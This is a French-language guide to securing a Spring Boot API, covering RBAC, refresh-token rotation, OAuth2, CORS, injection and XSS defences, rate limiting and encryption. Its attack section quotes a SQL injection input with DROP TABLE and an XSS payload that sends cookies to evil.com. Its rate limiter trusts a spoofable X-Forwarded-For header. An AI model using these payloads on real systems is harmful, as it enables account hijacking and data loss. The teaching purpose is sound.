# 📕 Guide Spring Boot — Sécurité Avancée

> Guide de référence : sécuriser une API Spring Boot au niveau production — rôles et permissions, OAuth2, refresh tokens, CORS, protection contre les attaques, rate limiting.
> Version cible : **Spring Boot 3.x** / **Spring Security 6.x** / **Java 17+**
> Prérequis : le guide 1 (§7 : OTP + JWT + `SecurityConfig` de base).

---

## Table des matières

1. [Rappel : comment fonctionne Spring Security](#1-comment-fonctionne-spring-security)
2. [Rôles & permissions (RBAC)](#2-rôles--permissions-rbac)
3. [Sécurité au niveau des méthodes (@PreAuthorize)](#3-preauthorize--la-sécurité-par-méthode)
4. [Refresh tokens — compléter le JWT](#4-refresh-tokens)
5. [OAuth2 — connexion via Google/GitHub](#5-oauth2--connexion-via-googlegithub)
6. [CORS en détail](#6-cors)
7. [Protection contre les attaques courantes](#7-protection-contre-les-attaques)
8. [Rate limiting (Bucket4j)](#8-rate-limiting)
9. [Chiffrement & gestion des mots de passe](#9-chiffrement--mots-de-passe)
10. [Headers de sécurité HTTP](#10-headers-de-sécurité)
11. [Audit & journalisation de sécurité](#11-audit--journalisation)
12. [Checklist sécurité avant mise en production](#12-checklist)

---

## 1. Comment fonctionne Spring Security

### La chaîne de filtres

Toute requête HTTP traverse une **chaîne de filtres** avant d'atteindre ton controller :

```
Requête HTTP
    │
    ▼
┌─────────────────────────────────────────────────┐
│           SecurityFilterChain                   │
│  CorsFilter → CsrfFilter → JwtAuthFilter → ...  │
└──────────────────┬──────────────────────────────┘
                   ▼
        SecurityContextHolder            ← "qui est l'utilisateur courant ?"
                   │
                   ▼
        Autorisation (règles d'accès)    ← "a-t-il le droit ?"
                   │
                   ▼
            Ton @RestController
```

### Les 3 concepts à distinguer absolument

| Concept | Question | Exemple |
|---|---|---|
| **Authentification** | *Qui es-tu ?* | vérifier le JWT, le code OTP, le mot de passe |
| **Autorisation** | *As-tu le droit ?* | seul un ADMIN peut supprimer un produit |
| **Principal** | *L'utilisateur courant* | l'objet stocké dans le `SecurityContextHolder` |

### Récupérer l'utilisateur courant dans un controller

```java
@GetMapping("/me")
public UserResponse getCurrentUser(Authentication authentication) {
    String phone = authentication.getName();          // le "subject" du JWT
    return userService.getByPhone(phone);
}

// Ou avec @AuthenticationPrincipal si tu utilises un UserDetails personnalisé :
@GetMapping("/me")
public UserResponse getCurrentUser(@AuthenticationPrincipal CustomUserDetails user) {
    return userService.getById(user.getId());
}
```

---

## 2. Rôles & permissions (RBAC)

**RBAC** (Role-Based Access Control) : chaque utilisateur a un ou plusieurs **rôles**, chaque rôle donne des **droits**.

### 2.1 Modéliser les rôles

```java
// domain/model/Role.java
public enum Role {
    USER,       // utilisateur standard
    MODERATOR,  // peut modérer le contenu
    ADMIN       // accès total
}

// infrastructure/persistence/entity/UserEntity.java
@Entity
@Table(name = "users")
@Getter @Setter @NoArgsConstructor
public class UserEntity {
    @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(unique = true, nullable = false)
    private String phone;

    private String email;

    @ElementCollection(fetch = FetchType.EAGER)     // EAGER acceptable ici : petite collection
    @CollectionTable(name = "user_roles", joinColumns = @JoinColumn(name = "user_id"))
    @Enumerated(EnumType.STRING)                    // TOUJOURS STRING, jamais ORDINAL
    @Column(name = "role")
    private Set<Role> roles = new HashSet<>(Set.of(Role.USER));
}
```

```sql
-- Migration Flyway V4__create_users_and_roles.sql
CREATE TABLE users (
    id    BIGSERIAL PRIMARY KEY,
    phone VARCHAR(20) UNIQUE NOT NULL,
    email VARCHAR(255)
);
CREATE TABLE user_roles (
    user_id BIGINT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    role    VARCHAR(20) NOT NULL,
    PRIMARY KEY (user_id, role)
);
```

### 2.2 Mettre les rôles dans le JWT

À la génération du token (après vérification OTP), on embarque les rôles en **claim** :

```java
// infrastructure/security/JwtService.java
public String generateToken(String subject, Set<Role> roles) {
    return Jwts.builder()
        .subject(subject)
        .claim("roles", roles.stream().map(Enum::name).toList())   // ["USER","ADMIN"]
        .issuedAt(new Date())
        .expiration(new Date(System.currentTimeMillis() + expirationMs))
        .signWith(key())
        .compact();
}

@SuppressWarnings("unchecked")
public List<String> extractRoles(String token) {
    Claims claims = Jwts.parser().verifyWith(key()).build()
        .parseSignedClaims(token).getPayload();
    return claims.get("roles", List.class);
}
```

Et dans le filtre JWT, on transforme les rôles en **authorities** Spring :

```java
// infrastructure/security/JwtAuthFilter.java — version avec rôles
@Override
protected void doFilterInternal(HttpServletRequest request,
                                HttpServletResponse response,
                                FilterChain chain) throws ServletException, IOException {
    String header = request.getHeader("Authorization");
    if (header != null && header.startsWith("Bearer ")) {
        String token = header.substring(7);
        if (jwtService.isValid(token)) {
            String phone = jwtService.extractSubject(token);

            // Convention Spring : préfixe "ROLE_" pour les rôles
            List<SimpleGrantedAuthority> authorities = jwtService.extractRoles(token).stream()
                .map(r -> new SimpleGrantedAuthority("ROLE_" + r))
                .toList();

            var auth = new UsernamePasswordAuthenticationToken(phone, null, authorities);
            SecurityContextHolder.getContext().setAuthentication(auth);
        }
    }
    chain.doFilter(request, response);
}
```

> ⚠️ **Le piège du préfixe `ROLE_`** : Spring l'ajoute implicitement quand tu utilises `hasRole("ADMIN")` — il cherche l'authority `ROLE_ADMIN`. Avec `hasAuthority("ROLE_ADMIN")`, tu écris le nom complet. Choisis une convention et tiens-la partout.

### 2.3 Règles d'accès par URL

```java
// infrastructure/security/SecurityConfig.java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(AbstractHttpConfigurer::disable)   // OK pour une API stateless à JWT (cf. §7.3)
        .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(auth -> auth
            // ─── Public ───
            .requestMatchers("/api/v1/auth/**").permitAll()
            .requestMatchers("/actuator/health").permitAll()
            .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll()

            // ─── Par méthode HTTP + rôle ───
            .requestMatchers(HttpMethod.GET,    "/api/v1/products/**").hasAnyRole("USER", "ADMIN")
            .requestMatchers(HttpMethod.POST,   "/api/v1/products/**").hasRole("ADMIN")
            .requestMatchers(HttpMethod.PUT,    "/api/v1/products/**").hasRole("ADMIN")
            .requestMatchers(HttpMethod.DELETE, "/api/v1/products/**").hasRole("ADMIN")

            // ─── Zone admin complète ───
            .requestMatchers("/api/v1/admin/**").hasRole("ADMIN")

            // ─── Tout le reste : authentifié ───
            .anyRequest().authenticated())
        .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)

        // Réponses propres 401/403 en JSON (au lieu des pages HTML par défaut)
        .exceptionHandling(ex -> ex
            .authenticationEntryPoint((req, res, e) -> {           // 401 : pas authentifié
                res.setStatus(401);
                res.setContentType("application/json");
                res.getWriter().write("{\"status\":401,\"message\":\"Authentification requise\"}");
            })
            .accessDeniedHandler((req, res, e) -> {                // 403 : pas les droits
                res.setStatus(403);
                res.setContentType("application/json");
                res.getWriter().write("{\"status\":403,\"message\":\"Accès refusé\"}");
            }));
    return http.build();
}
```

| Code | Signification | Cas |
|---|---|---|
| **401** Unauthorized | Non authentifié | pas de token / token invalide ou expiré |
| **403** Forbidden | Authentifié mais pas les droits | USER qui appelle un endpoint ADMIN |

---

## 3. @PreAuthorize — la sécurité par méthode

Les règles par URL (§2.3) sont un premier filet. Pour des règles **fines et métier**, on sécurise directement les méthodes.

### Activation

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity     // ← active @PreAuthorize / @PostAuthorize
public class SecurityConfig { ... }
```

### Utilisation

```java
@Service
@RequiredArgsConstructor
public class OrderService {

    // Rôle simple
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteOrder(Long orderId) { ... }

    // Plusieurs rôles
    @PreAuthorize("hasAnyRole('ADMIN', 'MODERATOR')")
    public void flagOrder(Long orderId) { ... }

    // Comparer avec l'utilisateur courant (authentication.name = subject du JWT)
    @PreAuthorize("#phone == authentication.name")
    public List<Order> getOrdersOf(String phone) { ... }

    // Combiner : le propriétaire OU un admin
    @PreAuthorize("hasRole('ADMIN') or #phone == authentication.name")
    public Order getOrderDetail(String phone, Long orderId) { ... }

    // Déléguer à un bean pour la logique complexe (recommandé dès que ça se complique)
    @PreAuthorize("@orderSecurity.canAccess(#orderId, authentication)")
    public Order getById(Long orderId) { ... }
}

// Le bean de décision :
@Component("orderSecurity")
@RequiredArgsConstructor
public class OrderSecurity {
    private final OrderRepositoryPort orderRepository;

    public boolean canAccess(Long orderId, Authentication auth) {
        return orderRepository.findById(orderId)
            .map(order -> order.getOwnerPhone().equals(auth.getName()))
            .orElse(false);
    }
}
```

### Le contrôle d'accès aux objets (protection IDOR)

**IDOR** (Insecure Direct Object Reference) = la faille la plus courante des API : `GET /api/v1/orders/42` où l'utilisateur A peut lire la commande de l'utilisateur B juste en changeant l'ID.

> 🛡️ **Règle** : être authentifié ne suffit JAMAIS pour accéder à une ressource. Il faut vérifier que la ressource **appartient** à l'utilisateur (ou qu'il est admin). C'est exactement ce que fait `@orderSecurity.canAccess(...)` ci-dessus — à appliquer sur **chaque** endpoint qui prend un ID.

### `@PreAuthorize` vs règles par URL : les deux !

| | Règles par URL (`SecurityFilterChain`) | `@PreAuthorize` |
|---|---|---|
| Niveau | grossier (par chemin) | fin (par méthode, avec les arguments) |
| Rôle | première barrière | règles métier (propriété, conditions) |
| Stratégie | **défense en profondeur : combiner les deux** | |

---

## 4. Refresh tokens

### Le problème

Un JWT d'accès (access token) a une durée de vie. Deux mauvais choix possibles :
- **Longue durée (24h+)** : si le token est volé, l'attaquant a 24h d'accès, et impossible de le révoquer (le JWT est autoportant)
- **Courte durée (15 min)** : l'utilisateur doit se reconnecter sans arrêt

### La solution : le couple access + refresh token

| | Access token | Refresh token |
|---|---|---|
| Durée | **courte** (15 min) | **longue** (7-30 jours) |
| Format | JWT | chaîne aléatoire opaque |
| Stocké côté serveur ? | ❌ non (stateless) | ✅ **oui, en BDD (hashé)** → révocable ! |
| Usage | chaque requête API | uniquement pour obtenir un nouvel access token |

```
Login OTP ─▶ { accessToken (15min), refreshToken (7j) }
   │
   ├─ Requêtes API avec accessToken...
   │
   ├─ accessToken expiré (401) ─▶ POST /auth/refresh { refreshToken }
   │                                └─▶ nouveau couple { accessToken, refreshToken }
   │                                    (rotation : l'ancien refresh est invalidé)
   └─ Logout ─▶ suppression du refreshToken en BDD → session réellement terminée
```

### Implémentation

```sql
-- Migration Flyway V5__create_refresh_tokens.sql
CREATE TABLE refresh_tokens (
    id           BIGSERIAL PRIMARY KEY,
    user_phone   VARCHAR(20) NOT NULL,
    hashed_token VARCHAR(100) NOT NULL,
    expires_at   TIMESTAMP NOT NULL,
    revoked      BOOLEAN NOT NULL DEFAULT FALSE
);
CREATE INDEX idx_refresh_user ON refresh_tokens(user_phone);
```

```java
// application/service/RefreshTokenService.java
@Service
@RequiredArgsConstructor
public class RefreshTokenService {

    private final RefreshTokenRepositoryPort repository;
    private final JwtService jwtService;
    private final UserRepositoryPort userRepository;

    private static final SecureRandom RANDOM = new SecureRandom();
    private static final Duration VALIDITY = Duration.ofDays(7);

    /** Appelé au login (après vérification OTP) */
    public TokenPair issueTokens(String phone) {
        Set<Role> roles = userRepository.findByPhone(phone).orElseThrow().getRoles();
        String accessToken = jwtService.generateToken(phone, roles);
        String refreshToken = generateOpaqueToken();

        RefreshToken entity = new RefreshToken();
        entity.setUserPhone(phone);
        entity.setHashedToken(sha256(refreshToken));     // hashé en base, jamais en clair
        entity.setExpiresAt(Instant.now().plus(VALIDITY));
        repository.save(entity);

        return new TokenPair(accessToken, refreshToken);
    }

    /** Appelé par POST /auth/refresh */
    public TokenPair rotate(String refreshToken) {
        RefreshToken stored = repository.findByHashedToken(sha256(refreshToken))
            .orElseThrow(() -> new InvalidTokenException("Refresh token inconnu"));

        if (stored.isRevoked()) {
            // 🚨 Réutilisation d'un token déjà tourné = vol probable → tout révoquer
            repository.revokeAllForUser(stored.getUserPhone());
            throw new InvalidTokenException("Token réutilisé — sessions révoquées");
        }
        if (Instant.now().isAfter(stored.getExpiresAt()))
            throw new InvalidTokenException("Refresh token expiré, reconnectez-vous");

        stored.setRevoked(true);                 // ROTATION : usage unique
        repository.save(stored);
        return issueTokens(stored.getUserPhone());
    }

    /** Appelé par POST /auth/logout */
    public void revoke(String refreshToken) {
        repository.findByHashedToken(sha256(refreshToken))
            .ifPresent(t -> { t.setRevoked(true); repository.save(t); });
    }

    private String generateOpaqueToken() {
        byte[] bytes = new byte[64];
        RANDOM.nextBytes(bytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
    }

    private String sha256(String value) {
        try {
            byte[] hash = MessageDigest.getInstance("SHA-256")
                .digest(value.getBytes(StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(hash);
        } catch (NoSuchAlgorithmException e) { throw new IllegalStateException(e); }
    }
}
```

```java
// Endpoints à ajouter au controller d'auth :
public record RefreshRequest(@NotBlank String refreshToken) {}

@PostMapping("/refresh")
public ResponseEntity<TokenPair> refresh(@Valid @RequestBody RefreshRequest req) {
    return ResponseEntity.ok(refreshTokenService.rotate(req.refreshToken()));
}

@PostMapping("/logout")
public ResponseEntity<Void> logout(@Valid @RequestBody RefreshRequest req) {
    refreshTokenService.revoke(req.refreshToken());
    return ResponseEntity.noContent().build();
}
```

### Où stocker les tokens côté client ?

| Client | Access token | Refresh token |
|---|---|---|
| SPA web (React...) | mémoire JS (variable) | **cookie HttpOnly + Secure + SameSite** (inaccessible au JS → protégé du XSS) |
| Mobile | stockage sécurisé (Keychain iOS / Keystore Android) | idem |
| ❌ À éviter | `localStorage` pour les tokens sensibles (lisible par n'importe quel script XSS) | |

---

## 5. OAuth2 — connexion via Google/GitHub

### Principe (OAuth2 / OpenID Connect en 30 secondes)

Plutôt que de gérer des mots de passe, on **délègue l'authentification** à un fournisseur (Google, GitHub...) :

```
1. L'utilisateur clique "Se connecter avec Google"
2. Redirection vers Google → il s'authentifie CHEZ Google
3. Google redirige vers ton app avec un code
4. Spring échange ce code contre les infos de l'utilisateur (email, nom...)
5. Ton app crée/retrouve l'utilisateur en BDD et émet SES PROPRES tokens (JWT + refresh)
```

### Mise en place

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
```

Créer les identifiants dans la console du fournisseur ([console.cloud.google.com](https://console.cloud.google.com) → APIs & Services → Credentials → OAuth client ID) avec l'URI de redirection : `http://localhost:8080/login/oauth2/code/google`

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope: openid, profile, email
          github:
            client-id: ${GITHUB_CLIENT_ID}
            client-secret: ${GITHUB_CLIENT_SECRET}
            scope: read:user, user:email
```

### Intégration avec ton système JWT existant

```java
// Dans SecurityConfig :
.oauth2Login(oauth -> oauth
    .successHandler(oAuth2SuccessHandler))   // notre handler personnalisé

// infrastructure/security/OAuth2SuccessHandler.java
@Component
@RequiredArgsConstructor
public class OAuth2SuccessHandler implements AuthenticationSuccessHandler {

    private final UserRepositoryPort userRepository;
    private final RefreshTokenService refreshTokenService;

    @Override
    public void onAuthenticationSuccess(HttpServletRequest request,
                                        HttpServletResponse response,
                                        Authentication authentication) throws IOException {
        OAuth2User oauthUser = (OAuth2User) authentication.getPrincipal();
        String email = oauthUser.getAttribute("email");

        // Créer l'utilisateur s'il n'existe pas (provisioning)
        User user = userRepository.findByEmail(email)
            .orElseGet(() -> userRepository.save(User.fromOAuth(email,
                oauthUser.getAttribute("name"))));

        // Émettre NOS tokens et rediriger vers le front
        TokenPair tokens = refreshTokenService.issueTokens(user.getIdentifier());
        response.sendRedirect("https://mon-front.com/oauth/callback"
            + "?accessToken=" + tokens.accessToken());
        // (en prod : préférer poser le refresh en cookie HttpOnly plutôt qu'en URL)
    }
}
```

> 💡 Résultat : ton API accepte **deux portes d'entrée** (OTP téléphone et Google/GitHub) mais un **seul système de session** (tes JWT + refresh tokens). Le reste de l'app ne voit aucune différence.

---

## 6. CORS

### Le problème

Un navigateur bloque par défaut les appels JavaScript vers un **autre domaine** que celui de la page. Ton front `https://mon-front.com` qui appelle `https://api.mondomaine.com` → bloqué sans configuration CORS. Symptôme classique dans la console : *"has been blocked by CORS policy"*.

### La configuration propre (globale, dans SecurityConfig)

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of(
        "http://localhost:3000",          // front en dev
        "https://mon-front.com"           // front en prod
    ));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setExposedHeaders(List.of("Location"));
    config.setAllowCredentials(true);     // nécessaire si cookies (refresh token)
    config.setMaxAge(3600L);              // cache du preflight : 1h

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return source;
}

// Et dans le SecurityFilterChain :
http.cors(cors -> cors.configurationSource(corsConfigurationSource()))
```

### Règles CORS

- ❌ **Jamais `allowedOrigins("*")` en production** — surtout combiné à `allowCredentials(true)` (interdit par la spec, et dangereux)
- ✅ Lister explicitement les origines par environnement (via une propriété `${app.cors.allowed-origins}`)
- 💡 Le navigateur envoie d'abord une requête **OPTIONS** (« preflight ») : si tu vois des OPTIONS en 403 dans les logs, c'est ta config CORS qui bloque
- 🧠 CORS protège **les utilisateurs dans leur navigateur**, pas ton API : un attaquant avec curl n'est pas concerné. Ce n'est PAS un mécanisme d'authentification.

---

## 7. Protection contre les attaques

### 7.1 Injection SQL

**L'attaque** : `GET /products/search?name=' OR '1'='1` → si la requête est concaténée, elle retourne tout (ou pire : `'; DROP TABLE users; --`).

**La protection** : des requêtes **paramétrées**, jamais de concaténation.

```java
// ✅ SÛRS — paramètres liés, JPA échappe tout :
List<ProductEntity> findByNameContainingIgnoreCase(String name);

@Query("SELECT p FROM ProductEntity p WHERE p.name = :name")
List<ProductEntity> findByName(@Param("name") String name);

// ❌ VULNÉRABLE — NE JAMAIS FAIRE :
@Query(value = "SELECT * FROM products WHERE name = '" + ??? + "'", nativeQuery = true)
// ou entityManager.createNativeQuery("... WHERE name = '" + name + "'")
```

> ✅ Bonne nouvelle : si tu utilises Spring Data JPA normalement (méthodes dérivées, `@Query` avec `:param`), tu es protégé. Le danger n'apparaît qu'avec des requêtes natives construites par concaténation.

### 7.2 XSS (Cross-Site Scripting)

**L'attaque** : un utilisateur enregistre `<script>document.location='http://evil.com?c='+document.cookie</script>` comme "nom de produit" ; le script s'exécute chez tous ceux qui affichent ce produit.

**Les protections côté API :**

```java
// 1. Validation stricte en entrée (rejeter ce qui n'a pas de raison d'être là)
public record ProductRequest(
    @NotBlank
    @Pattern(regexp = "^[\\p{L}0-9 '\\-.,]{2,100}$",
             message = "Caractères non autorisés dans le nom")
    String name,
    ...
) {}

// 2. Si tu dois accepter du HTML (éditeur riche) : assainir avec OWASP Java HTML Sanitizer
// <dependency> com.googlecode.owasp-java-html-sanitizer : owasp-java-html-sanitizer </dependency>
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safe = policy.sanitize(userInput);   // supprime scripts, onclick, etc.
```

3. Toujours répondre `Content-Type: application/json` (jamais du HTML construit avec des données utilisateur) — c'est le défaut de `@RestController`.
4. L'échappement à l'affichage est la responsabilité du **front** (React échappe par défaut) — mais l'API doit refuser de stocker n'importe quoi.

### 7.3 CSRF (Cross-Site Request Forgery)

**L'attaque** : un site malveillant fait soumettre au navigateur de la victime une requête vers ton API en profitant de ses **cookies de session** envoyés automatiquement.

**Pourquoi on peut désactiver CSRF sur une API JWT stateless** : l'attaque repose sur l'envoi automatique des cookies. Un header `Authorization: Bearer ...` n'est **jamais** envoyé automatiquement par le navigateur → pas de vecteur CSRF.

```java
.csrf(AbstractHttpConfigurer::disable)   // OK si ET SEULEMENT SI auth par header Bearer
```

> ⚠️ **MAIS** : si tu mets le refresh token en **cookie** (recommandé au §4), l'endpoint `/auth/refresh` redevient sensible. Protections : cookie `SameSite=Strict` (ou `Lax`), vérifier le header `Origin`, et limiter ce cookie au seul chemin `/api/v1/auth/refresh` (`path`).

### 7.4 Mass Assignment

**L'attaque** : ton endpoint accepte l'entité directement, l'attaquant envoie `{"name":"x", "roles":["ADMIN"]}` et se promeut admin.

**La protection** : des **DTO dédiés** qui n'exposent QUE les champs modifiables par le client (jamais `@RequestBody UserEntity`). C'est déjà la règle de la Clean Architecture du guide 1 — elle est aussi une règle de sécurité.

### 7.5 Fuites d'information

- ❌ Jamais de stacktrace dans la réponse → le `GlobalExceptionHandler` (guide 1 §5) renvoie un message générique en 500
- ❌ Messages d'erreur trop précis sur l'auth : préférer "identifiants invalides" à "ce numéro n'existe pas" (énumération de comptes)
- ❌ `server.error.include-stacktrace: never` et désactiver Swagger en prod si l'API n'est pas publique :

```yaml
# application-prod.yml
springdoc:
  api-docs:
    enabled: false
  swagger-ui:
    enabled: false
server:
  error:
    include-stacktrace: never
    include-message: never
```

### 7.6 Référence : le Top 10 OWASP

Garde sous le coude [OWASP Top 10](https://owasp.org/www-project-top-ten/) et [OWASP API Security Top 10](https://owasp.org/API-Security/) — les listes de référence des vulnérabilités. Celles traitées dans ce guide : Broken Access Control (§2-3), Injection (§7.1), Broken Authentication (§4), Security Misconfiguration (§7.5, §10).

---

## 8. Rate limiting

### Pourquoi

- Empêcher le **brute force** (essayer 10 000 codes OTP)
- Empêcher le **SMS bombing** (spammer `/auth/otp/request` → facture Twilio explosée)
- Protéger des **abus / DoS applicatifs**

### Implémentation avec Bucket4j (algorithme token bucket)

```xml
<dependency>
    <groupId>com.bucket4j</groupId>
    <artifactId>bucket4j-core</artifactId>
    <version>8.10.1</version>
</dependency>
```

```java
// infrastructure/security/RateLimitFilter.java
@Component
public class RateLimitFilter extends OncePerRequestFilter {

    // Un bucket par IP (en production multi-instances : stocker dans Redis via bucket4j-redis)
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();

    private Bucket newBucket(String path) {
        if (path.startsWith("/api/v1/auth/otp/request")) {
            // Anti SMS-bombing : 3 demandes / 15 min
            return Bucket.builder()
                .addLimit(Bandwidth.builder().capacity(3)
                    .refillGreedy(3, Duration.ofMinutes(15)).build())
                .build();
        }
        if (path.startsWith("/api/v1/auth")) {
            // Auth en général : 10 req / min
            return Bucket.builder()
                .addLimit(Bandwidth.builder().capacity(10)
                    .refillGreedy(10, Duration.ofMinutes(1)).build())
                .build();
        }
        // API générale : 100 req / min
        return Bucket.builder()
            .addLimit(Bandwidth.builder().capacity(100)
                .refillGreedy(100, Duration.ofMinutes(1)).build())
            .build();
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        String key = clientIp(request) + ":" + bucketGroup(request.getRequestURI());
        Bucket bucket = buckets.computeIfAbsent(key, k -> newBucket(request.getRequestURI()));

        if (bucket.tryConsume(1)) {
            chain.doFilter(request, response);
        } else {
            response.setStatus(429);   // Too Many Requests
            response.setContentType("application/json");
            response.getWriter().write(
                "{\"status\":429,\"message\":\"Trop de requêtes, réessayez plus tard\"}");
        }
    }

    private String bucketGroup(String uri) {
        if (uri.startsWith("/api/v1/auth/otp/request")) return "otp";
        if (uri.startsWith("/api/v1/auth")) return "auth";
        return "api";
    }

    private String clientIp(HttpServletRequest request) {
        // Derrière Nginx : la vraie IP est dans X-Forwarded-For (première valeur)
        String xff = request.getHeader("X-Forwarded-For");
        return (xff != null) ? xff.split(",")[0].trim() : request.getRemoteAddr();
    }
}
```

Puis l'enregistrer AVANT le filtre JWT :

```java
.addFilterBefore(rateLimitFilter, JwtAuthFilter.class)
```

> 💡 En complément : Nginx peut aussi limiter en amont (`limit_req_zone`), et pour un système distribué (plusieurs instances), les compteurs doivent vivre dans **Redis** — sinon chaque instance a son propre quota.

---

## 9. Chiffrement & mots de passe

### Les 3 familles — ne pas les confondre

| Famille | Réversible ? | Usage | Outils |
|---|---|---|---|
| **Hashage** (one-way) | ❌ non | mots de passe, OTP, refresh tokens | BCrypt, Argon2 |
| **Chiffrement symétrique** | ✅ avec la clé | données sensibles en BDD | AES-GCM |
| **Signature** | vérifiable | intégrité du JWT | HMAC-SHA256, RSA |

### Mots de passe & OTP : BCrypt (jamais MD5/SHA seuls !)

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);   // coût 12 : bon compromis 2026
}

// Usage :
String hash = passwordEncoder.encode(rawPassword);       // à stocker
boolean ok  = passwordEncoder.matches(rawPassword, hash); // à la vérification
```

Pourquoi BCrypt : **lent par conception** (rend le brute force coûteux) + **salt automatique** (deux mots de passe identiques → hashs différents, contrant les rainbow tables).

### Chiffrer des données sensibles en BDD (AES-GCM)

Pour des données qu'il faut pouvoir relire (IBAN, numéro de sécu...) :

```java
@Component
public class AesEncryptionService {

    private final SecretKey key;

    public AesEncryptionService(@Value("${app.encryption.key}") String base64Key) {
        this.key = new SecretKeySpec(Base64.getDecoder().decode(base64Key), "AES"); // clé 256 bits
    }

    public String encrypt(String plaintext) {
        try {
            byte[] iv = new byte[12];
            new SecureRandom().nextBytes(iv);              // IV unique à CHAQUE chiffrement
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
            byte[] ct = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));
            ByteBuffer bb = ByteBuffer.allocate(iv.length + ct.length).put(iv).put(ct);
            return Base64.getEncoder().encodeToString(bb.array());
        } catch (GeneralSecurityException e) { throw new IllegalStateException(e); }
    }

    public String decrypt(String encoded) {
        try {
            ByteBuffer bb = ByteBuffer.wrap(Base64.getDecoder().decode(encoded));
            byte[] iv = new byte[12]; bb.get(iv);
            byte[] ct = new byte[bb.remaining()]; bb.get(ct);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
            return new String(cipher.doFinal(ct), StandardCharsets.UTF_8);
        } catch (GeneralSecurityException e) { throw new IllegalStateException(e); }
    }
}
```

### Règles sur les secrets applicatifs

- `JWT_SECRET` : ≥ 32 caractères aléatoires (`openssl rand -base64 48`)
- Clé AES : générée par `openssl rand -base64 32`, stockée en variable d'environnement / coffre
- Rotation planifiée + rotation immédiate en cas de doute

---

## 10. Headers de sécurité

Spring Security en pose plusieurs par défaut ; complète-les :

```java
// Dans le SecurityFilterChain :
.headers(headers -> headers
    .httpStrictTransportSecurity(hsts -> hsts        // force HTTPS pendant 1 an
        .includeSubDomains(true)
        .maxAgeInSeconds(31536000))
    .contentTypeOptions(Customizer.withDefaults())    // X-Content-Type-Options: nosniff
    .frameOptions(frame -> frame.deny())              // X-Frame-Options: DENY (anti-clickjacking)
    .referrerPolicy(ref -> ref
        .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.NO_REFERRER))
)
```

| Header | Protège contre |
|---|---|
| `Strict-Transport-Security` | rétrogradation HTTP (man-in-the-middle) |
| `X-Content-Type-Options: nosniff` | interprétation du contenu comme un autre type |
| `X-Frame-Options: DENY` | clickjacking (ton app dans une iframe invisible) |
| `Cache-Control: no-store` (sur les réponses sensibles) | données sensibles dans le cache navigateur |

Vérifie le résultat avec `curl -I https://api.mondomaine.com` ou [securityheaders.com](https://securityheaders.com).

---

## 11. Audit & journalisation

### Quoi journaliser (et quoi ne JAMAIS journaliser)

| ✅ À logger | ❌ À ne JAMAIS logger |
|---|---|
| Connexions réussies/échouées (qui, quand, IP) | mots de passe, codes OTP |
| Changements de rôles/permissions | tokens JWT/refresh complets |
| Accès refusés (403) répétés | données personnelles sensibles en clair |
| Dépassements de rate limit | numéros de carte bancaire |

```java
// Exemple : écouter les événements d'authentification de Spring Security
@Component
@Slf4j
public class SecurityEventListener {

    @EventListener
    public void onSuccess(AuthenticationSuccessEvent event) {
        log.info("AUTH_SUCCESS user={} ", event.getAuthentication().getName());
    }

    @EventListener
    public void onFailure(AbstractAuthenticationFailureEvent event) {
        log.warn("AUTH_FAILURE user={} reason={}",
            event.getAuthentication().getName(),
            event.getException().getMessage());
    }
}
```

### Audit des entités (qui a modifié quoi, quand)

```java
// Sur la classe principale : @EnableJpaAuditing
// Sur les entités :
@EntityListeners(AuditingEntityListener.class)
public class ProductEntity {
    @CreatedDate     private Instant createdAt;
    @LastModifiedDate private Instant updatedAt;
    @CreatedBy       private String createdBy;
    @LastModifiedBy  private String updatedBy;
}

// Dire à Spring qui est l'utilisateur courant :
@Bean
public AuditorAware<String> auditorProvider() {
    return () -> Optional.ofNullable(SecurityContextHolder.getContext().getAuthentication())
        .map(Authentication::getName);
}
```

---

## 12. Checklist

### Authentification & sessions

- [ ] Access token JWT court (15 min) + refresh token long, hashé en BDD, avec rotation (§4)
- [ ] Logout = révocation du refresh token
- [ ] OTP : hashé, expiration 5 min, 3 tentatives, usage unique (guide 1 §7.6)
- [ ] Réponses d'erreur d'auth non énumérables ("identifiants invalides")

### Autorisation

- [ ] Rôles dans le JWT + règles par URL (§2)
- [ ] `@EnableMethodSecurity` + `@PreAuthorize` sur les opérations sensibles (§3)
- [ ] **Contrôle de propriété sur CHAQUE ressource accessible par ID (anti-IDOR)** (§3)
- [ ] 401 vs 403 corrects, en JSON

### Durcissement

- [ ] CORS : origines listées explicitement, jamais `*` (§6)
- [ ] Aucune requête SQL concaténée (§7.1)
